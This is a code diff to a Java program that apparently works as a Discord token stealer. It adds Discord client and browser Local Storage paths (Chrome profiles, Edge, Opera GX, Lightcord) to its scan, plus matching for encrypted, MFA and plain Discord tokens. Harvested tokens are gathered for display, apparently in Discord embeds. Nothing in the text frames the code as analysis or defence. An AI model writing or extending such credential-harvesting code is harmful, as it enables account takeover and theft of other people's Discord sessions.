@@ -39,7 +39,12 @@ public final class Main {
     // --- KONSTANTEN ---
     private static final int DISCORD_EMBED_MAX_DESCRIPTION_LENGTH = 3500; // Discord limit is 4096, using 3500 for safety
     private static final int MAX_TOKEN_DISPLAY_LENGTH = 500;
-    private static final String DISCORD_TOKEN_PATTERN = "dQw4w9WgXcQ:"; // Discord's encrypted token identifier
+    private static final String[] DISCORD_TOKEN_PATTERNS = {
+        "dQw4w9WgXcQ",  // Encrypted token identifier
+        "mfa.",          // MFA token prefix
+        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27}",  // Regular Discord token pattern
+        "[\\.a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{38}"   // Alternative token pattern
+    };
 
     // --- HILFSMETHODEN ---
 
@@ -177,16 +182,24 @@ public final class Main {
         // Updated path format using cross-platform file separator
         String userHome = System.getProperty("user.home");
         String sep = File.separator;
+        
+        // Discord paths
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Discord" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordptb" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discordcanary" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Lightcord" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "discorddevelopment" + sep + "Local Storage" + sep + "leveldb"));
+        
+        // Browser paths
         paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Profile 1" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Google" + sep + "Chrome" + sep + "User Data" + sep + "Profile 2" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Microsoft" + sep + "Edge" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "Yandex" + sep + "YandexBrowser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Local" + sep + "BraveSoftware" + sep + "Brave-Browser" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
         paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
+        paths.add(new File(userHome + sep + "AppData" + sep + "Roaming" + sep + "Opera Software" + sep + "Opera GX Stable" + sep + "User Data" + sep + "Default" + sep + "Local Storage" + sep + "leveldb"));
 
-        // Correct Discord token identifier pattern from reference implementation
-        
         for (File file : paths) {
             if (file == null || !file.exists() || !file.isDirectory()) {
                 continue;
@@ -197,21 +210,53 @@ public final class Main {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                     String strLine;
                     while ((strLine = br.readLine()) != null && !strLine.isEmpty()) {
-                        // Use the correct Discord token identifier pattern
-                        int index = strLine.indexOf(DISCORD_TOKEN_PATTERN);
+                        // Check for encrypted Discord token pattern (dQw4w9WgXcQ)
+                        int index = strLine.indexOf("dQw4w9WgXcQ");
                         if (index != -1) {
                             try {
-                                // Extract token after the pattern using indexOf instead of split to avoid regex issues
-                                String afterPattern = strLine.substring(index + DISCORD_TOKEN_PATTERN.length());
-                                int quoteIndex = afterPattern.indexOf("\"");
-                                if (quoteIndex >= 0) {
-                                    String tokenPart = afterPattern.substring(0, quoteIndex);
-                                    if (!temp.contains(tokenPart) && !tokenPart.isEmpty()) {
-                                        temp.add(tokenPart);
+                                // Extract token after the pattern
+                                String afterPattern = strLine.substring(index);
+                                // Look for the full encrypted token
+                                int endIndex = afterPattern.indexOf("\"");
+                                if (endIndex > 11) {  // "dQw4w9WgXcQ" is 11 chars
+                                    String fullToken = afterPattern.substring(0, endIndex);
+                                    if (!temp.contains(fullToken) && !fullToken.isEmpty() && fullToken.length() > 20) {
+                                        temp.add(fullToken);
                                     }
                                 }
                             } catch (Exception ignored) {
-                                // Ignoriere Fehler beim Parsen, um den Scan fortzusetzen
+                            }
+                        }
+                        
+                        // Check for MFA tokens
+                        int mfaIndex = strLine.indexOf("mfa.");
+                        if (mfaIndex != -1) {
+                            try {
+                                String afterMfa = strLine.substring(mfaIndex);
+                                int endIndex = afterMfa.indexOf("\"");
+                                if (endIndex > 4) {  // "mfa." is 4 chars
+                                    String mfaToken = afterMfa.substring(0, endIndex);
+                                    if (!temp.contains(mfaToken) && !mfaToken.isEmpty() && mfaToken.length() > 50) {
+                                        temp.add(mfaToken);
+                                    }
+                                }
+                            } catch (Exception ignored) {
+                            }
+                        }
+                        
+                        // Search for regular Discord token patterns using regex-like matching
+                        // Pattern: base64(user_id).base64(timestamp).base64(hmac)
+                        for (int i = 0; i < strLine.length() - 80; i++) {
+                            try {
+                                String substr = strLine.substring(i, Math.min(i + 100, strLine.length()));
+                                // Look for tokens that match the pattern: alphanumeric.alphanumeric.alphanumeric
+                                if (substr.matches("^[A-Za-z0-9_-]{24}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27,}.*")) {
+                                    String potentialToken = substr.split("[^A-Za-z0-9._-]")[0];
+                                    if (potentialToken.length() >= 59 && !temp.contains(potentialToken)) {
+                                        temp.add(potentialToken);
+                                    }
+                                }
+                            } catch (Exception ignored) {
                             }
                         }
                     }
